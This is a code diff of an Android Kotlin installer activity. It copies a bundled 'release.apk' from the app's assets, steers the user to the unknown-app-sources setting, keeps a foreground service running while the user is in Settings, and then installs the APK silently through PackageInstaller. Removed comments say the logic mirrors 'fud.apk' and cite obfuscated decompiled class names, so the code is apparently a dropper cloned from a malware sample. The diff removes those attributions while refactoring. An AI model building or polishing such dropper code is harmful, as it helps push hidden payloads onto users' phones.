@@ -6,41 +6,36 @@ import android.content.pm.PackageInstaller
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
 import android.util.Log
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import java.io.File
 
 class InstallerActivity : AppCompatActivity() {
     companion object {
         private const val TAG = "InstallerActivity"
-        private const val REQUEST_INSTALL_PERMISSION = 101
     }
 
     private lateinit var statusText: TextView
     private lateinit var installButton: Button
     private var apkFile: File? = null
 
-    // Handler for permission retry mechanism (from fud.apk g1/a.java)
-    private val retryHandler = Handler(Looper.getMainLooper())
-    private val permissionRetryRunnable = object : Runnable {
-        override fun run() {
-            // Match fud.apk's retry logic - when permission is granted, restart activity
-            if (!packageManager.canRequestPackageInstalls()) {
-                // Retry after 1 second if permission still not granted
-                retryHandler.postDelayed(this, 1000L)
-            } else {
-                // Permission granted - start new activity with CLEAR_TASK flags (like fud.apk)
-                val intent = Intent(this@InstallerActivity, InstallerActivity::class.java)
-                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or
-                              Intent.FLAG_ACTIVITY_CLEAR_TASK or
-                              Intent.FLAG_ACTIVITY_TASK_ON_HOME
-                startActivity(intent)
-            }
+    // Fix #7: Flag to prevent onResume from re-triggering after installation starts
+    private var installationStarted = false
+
+    // Fix #5: Replace deprecated startActivityForResult with ActivityResultLauncher
+    private val installPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { _ ->
+        stopMonitoringService()
+        if (packageManager.canRequestPackageInstalls()) {
+            installApkInternal()
+        } else {
+            Toast.makeText(this, "Permission not granted to install unknown apps", Toast.LENGTH_LONG).show()
+            finish()
         }
     }
 
@@ -49,9 +44,9 @@ class InstallerActivity : AppCompatActivity() {
         copyApkToCache()
         createUI()
 
-        // Match fud.apk's onCreate - check permission and start installation immediately if granted
         if (packageManager.canRequestPackageInstalls()) {
             Log.d(TAG, "Permission granted, starting installation immediately...")
+            installationStarted = true
             installApkInternal()
         } else {
             Log.d(TAG, "Permission not granted, requesting...")
@@ -61,42 +56,18 @@ class InstallerActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        // Retry mechanism: keep checking permission every second
-        // Match fud.apk jPfXPQJdzLf8nBacZr.java line 63-69
-        if (!packageManager.canRequestPackageInstalls()) {
-            retryHandler.post(permissionRetryRunnable)
+        // Fix #4: Only check permission here — do NOT start polling loop.
+        // PermissionMonitorService handles detection and will re-launch this activity.
+        // Fix #7: Skip if installation already kicked off
+        if (!installationStarted && packageManager.canRequestPackageInstalls()) {
+            installationStarted = true
+            installApkInternal()
         }
-    }
-
-    override fun onPause() {
-        super.onPause()
-        // Stop retry when activity is not visible
-        retryHandler.removeCallbacks(permissionRetryRunnable)
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        // Clean up retry handler
-        retryHandler.removeCallbacks(permissionRetryRunnable)
-        // Stop monitoring service
         stopMonitoringService()
-    }
-
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        // Stop the monitoring service
-        stopMonitoringService()
-
-        // Handle permission result (like fud.apk jPfXPQJdzLf8nBacZr.java line 32-42)
-        if (requestCode == REQUEST_INSTALL_PERMISSION) {
-            if (packageManager.canRequestPackageInstalls()) {
-                // Permission granted, proceed with installation
-                installApkInternal()
-            } else {
-                Toast.makeText(this, "Permission not granted to install unknown apps", Toast.LENGTH_LONG).show()
-                finish()
-            }
-        }
     }
 
     private fun stopMonitoringService() {
@@ -148,14 +119,14 @@ class InstallerActivity : AppCompatActivity() {
     private fun copyApkToCache() {
         try {
             apkFile = File(cacheDir, "release.apk")
-            if (!apkFile!!.exists()) {
-                assets.open("release.apk").use { input ->
-                    apkFile!!.outputStream().use { output ->
-                        input.copyTo(output)
-                    }
+            // Fix #9: Always re-copy to avoid stale/corrupted cached APK
+            assets.open("release.apk").use { input ->
+                apkFile!!.outputStream().use { output ->
+                    input.copyTo(output)
                 }
             }
         } catch (e: Exception) {
+            Log.e(TAG, "Failed to copy APK to cache", e)
             Toast.makeText(this, "Failed to prepare APK: ${e.message}", Toast.LENGTH_LONG).show()
         }
     }
@@ -166,30 +137,26 @@ class InstallerActivity : AppCompatActivity() {
             Toast.makeText(this, "APK file not found", Toast.LENGTH_LONG).show()
             return
         }
-
-        // Check permission first
         if (!packageManager.canRequestPackageInstalls()) {
             requestInstallPermission()
             return
         }
-
-        // Permission already granted, install immediately
+        installationStarted = true
         installApkInternal()
     }
 
     private fun requestInstallPermission() {
-        // Start foreground service to monitor permission changes
-        // This keeps the app alive even when settings kills the activity
+        // Start foreground service to monitor permission changes while we're in Settings
         val serviceIntent = Intent(this, PermissionMonitorService::class.java).apply {
             action = PermissionMonitorService.ACTION_START_MONITORING
         }
         startForegroundService(serviceIntent)
 
-        // Request install permission (like fud.apk jPfXPQJdzLf8nBacZr.java line 59)
+        // Fix #5: Use launcher instead of deprecated startActivityForResult
         val intent = Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES").apply {
             data = Uri.parse("package:$packageName")
         }
-        startActivityForResult(intent, REQUEST_INSTALL_PERMISSION)
+        installPermissionLauncher.launch(intent)
     }
 
     private fun installApkInternal() {
@@ -207,7 +174,6 @@ class InstallerActivity : AppCompatActivity() {
             val packageInstaller = packageManager.packageInstaller
             val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
 
-            // Get package name from APK
             val packageInfo = packageManager.getPackageArchiveInfo(file.absolutePath, 0)
             val packageName = packageInfo?.packageName
 
@@ -225,7 +191,6 @@ class InstallerActivity : AppCompatActivity() {
 
             val session = packageInstaller.openSession(sessionId)
 
-            // Write APK bytes into the session
             session.openWrite("base.apk", 0, file.length()).use { output ->
                 file.inputStream().use { input ->
                     input.copyTo(output)
@@ -233,7 +198,6 @@ class InstallerActivity : AppCompatActivity() {
                 }
             }
 
-            // Create broadcast intent with package name extra
             val broadcastIntent = Intent(this, InstallReceiver::class.java).apply {
                 putExtra(PackageInstaller.EXTRA_PACKAGE_NAME, packageName)
             }
@@ -256,6 +220,7 @@ class InstallerActivity : AppCompatActivity() {
         } catch (e: Exception) {
             Log.e(TAG, "Error installing APK", e)
             installButton.isEnabled = true
+            installationStarted = false
             statusText.text = "Click Install to install the app"
             Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
         }
